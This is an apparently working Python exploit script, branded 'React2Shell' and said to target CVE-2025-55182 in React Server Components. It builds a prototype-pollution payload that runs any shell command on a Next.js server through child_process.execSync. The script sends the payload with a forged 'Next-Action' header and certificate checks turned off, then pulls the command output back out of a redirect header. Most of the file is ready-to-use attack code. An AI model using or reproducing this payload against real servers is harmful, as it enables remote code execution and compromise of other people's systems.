import sys
import hashlib
import time
import re
from urllib.parse import unquote
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# =========================
# Theme & Branding
# =========================

class Theme:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DIM = '\033[2m'


class Signature:
    WEBSITE = "www.cybertechmind.com"
    EXPLOIT_NAME = "React2Shell"
    AUTHOR = "Moovendhan V"
    PROFILE = "profile.cybertechmind.com"
    TOOL_NAME = "CVE-2025-55182 RSC-RCE Exploit"
    VERSION = "1.0"


# =========================
# Config
# =========================

class ExploitConfig:
    def __init__(self):
        self.target_url = None
        self.payload_cmd = None
        self.timeout = 15

    def normalize_url(self, url):
        if not re.match(r'^https?://', url):
            return f"https://{url}"
        return url


# =========================
# UI / Banner
# =========================

class BannerDisplay:

    @staticmethod
    def show_header():
        print(f"""
{Theme.FAIL}{Theme.BOLD}
    ▌     ▗     ▌    ▘   ▌         
▛▘▌▌▛▌█▌▛▘▜▘█▌▛▘▛▌▛▛▌▌▛▌▛▌  ▛▘▛▌▛▛▌
▙▖▙▌▙▌▙▖▌ ▐▖▙▖▙▖▌▌▌▌▌▌▌▌▙▌▗ ▙▖▙▌▌▌▌
  ▄▌                               

{Theme.ENDC}
{Theme.OKCYAN}{Theme.BOLD}[{Signature.TOOL_NAME}]{Theme.ENDC}
{Theme.OKBLUE}CVE-2025-55182{Theme.ENDC}
{Theme.OKGREEN}Author : {Signature.AUTHOR}{Theme.ENDC}
{Theme.OKBLUE}Website : {Signature.WEBSITE}{Theme.ENDC}
""")

    @staticmethod
    def show_config(target, command):
        print(f"\n{Theme.OKBLUE}[*] EXPLOITATION PARAMETERS{Theme.ENDC}")
        print(f"{Theme.OKCYAN}TARGET  : {target}{Theme.ENDC}")
        print(f"{Theme.OKCYAN}PAYLOAD : {command}{Theme.ENDC}\n")

    @staticmethod
    def show_success(output):
        print(f"{Theme.OKGREEN}{Theme.BOLD}[+] EXPLOITATION SUCCESSFUL{Theme.ENDC}")
        for line in output.replace(' | ', '\n').split('\n'):
            if line.strip():
                print(f"{Theme.OKGREEN} ▸ {line}{Theme.ENDC}")

    @staticmethod
    def show_failure(status, details):
        print(f"{Theme.FAIL}{Theme.BOLD}[X] EXPLOIT FAILED{Theme.ENDC}")
        print(f"{Theme.WARNING}{status} — {details}{Theme.ENDC}")


# =========================
# Payload Builder
# =========================

class PayloadGenerator:

    @staticmethod
    def generate_hash(length=8):
        return hashlib.sha256(str(time.time()).encode()).hexdigest()[:length]

    @staticmethod
    def sanitize_command(cmd):
        return cmd.replace('\\', '\\\\').replace("'", "\\'").replace('\n', '')

    @staticmethod
    def build_payload(command):
        safe_cmd = PayloadGenerator.sanitize_command(command)

        injection = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
            f'"var res=process.mainModule.require(\'child_process\').execSync(\'{safe_cmd}\')'
            '.toString().trim().replace(/\\\\n/g, \' | \');'
            'throw Object.assign(new Error(\'NEXT_REDIRECT\'),'
            '{digest:`NEXT_REDIRECT;push;/login?a=${res};307;`});"},'
            '"_formData":{"get":"$1:constructor:constructor"}}}'
        )

        boundary = "----CyberTechMindBoundary"
        body = (
            f"--{boundary}\r\n"
            "Content-Disposition: form-data; name=\"0\"\r\n\r\n"
            f"{injection}\r\n"
            f"--{boundary}--\r\n"
        )

        return body, boundary


# =========================
# Exploit Engine
# =========================

class ExploitEngine:

    def __init__(self, config):
        self.config = config
        self.session = requests.Session()

    def execute(self):
        body, boundary = PayloadGenerator.build_payload(self.config.payload_cmd)

        headers = {
            "Next-Action": "x",
            "Content-Type": f"multipart/form-data; boundary={boundary}"
        }

        try:
            response = self.session.post(
                self.config.target_url,
                data=body,
                headers=headers,
                timeout=self.config.timeout,
                verify=False,
                allow_redirects=False
            )
            return self.parse_response(response)

        except requests.exceptions.RequestException as e:
            return False, "request_error", str(e)

    def parse_response(self, response):
        redirect = response.headers.get("X-Action-Redirect", "")
        match = re.search(r"/login\?a=([^;]*)", redirect)

        if match:
            return True, "success", unquote(match.group(1))

        return False, "failed", f"HTTP {response.status_code}"
